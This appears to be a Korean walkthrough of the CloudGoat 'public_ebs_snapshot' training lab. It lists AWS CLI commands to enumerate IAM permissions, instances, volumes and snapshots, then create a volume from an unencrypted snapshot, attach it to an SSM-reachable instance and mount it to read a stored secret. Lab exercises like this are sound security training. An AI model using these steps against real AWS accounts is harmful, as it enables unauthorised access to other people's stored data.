## 시나리오 리소스  

- 1 IAM Users
- 2 EC2 instances
- 1 EBS & Snapshot


## 실행 명령어  
`$ ./cloudgoat.py create public_ebs_snapshot`  

## 목표  

이 시나리오의 목표는 암호화되지 않은 공개 EBS 스냅샷을 사용하여 비밀값을 읽어내는 것입니다. 시크릿은 EBS의 특정 디렉터리에 저장되며, 그 값은 다음과 같은 형식(cg-secret-XXXXXX-XXXXXX)을 가집니다.  

## 개요

IAM 사용자 Block으로 시작하여 공격자는 먼저 EC2 인스턴스를 탐색하고 특정 인스턴스에 연결된 EBS볼륨의 스냅샷이 암호화 되지 않은 것을 발견합니다. 그런 다음 공격자는 주어진 SSH키를 활용하여 다른 EC2에 접근후 스냅샷을 사용하여 EBS에 저장되어있던 비밀 문자열을 획득 할 수 있습니다. 



***

### 1. 할당된 권한 확인

진행중인 IAM에게 할당된 권한을 확인해 주겠습니다.
`aws iam get-policy-version --policy-arn <Policy-Arn> --version-id v1 --profile <Profile_Name>`


aws iam get-policy-version --policy-arn arn:aws:iam::856460250113:policy/EC2CreatorPolicy --version-id v1 --profile cloudgoat

1. 인스턴스 id확인
aws ec2 describe-instances --profile block

2. 연결된 볼륨 확인
aws ec2 describe-volumes --filters "Name=attachment.instance-id,Values=<Your_EC2_instance_ID>" --profile block

3. 볼륨의 스냅샷 확인
aws ec2 describe-snapshots --filters "Name=volume-id,Values=<Volume-ID>" --profile block

--영상---
4. 스냅샷으로 볼륨 생성
aws ec2 create-volume --snapshot-id snap-0ed9a369c7acf1de9 --availability-zone us-east-1a --volume-type gp2 --size 1 --profile block


5. ssm으로 접속 가능한 ec2인스턴스를 확인
aws ssm describe-instance-information --profile block
*이거 권한 추가해줘야함 block에다가 describe할 수 있는 권한


6. 해당 인스턴스에 스냅샷으로 생성한 볼륨 연결
aws ec2 attach-volume --volume-id vol-0173b2eaff852024a --instance-id i-0b28d2c26cd360ff7 --device /dev/xvdf --profile block

7. 인스턴스에 ssm으로 접속
aws ssm start-session --target i-0b28d2c26cd360ff7 --profile block


8. 인스턴스에서 ebs볼륨 마운트 디렉토리 및 마운트 포인트 생성
sudo mkdir /mnt/mydata

9. 마운트
sudo mount /dev/xvdf /mnt/mydata

10. ebs데이터 확인
cd /mnt/mydata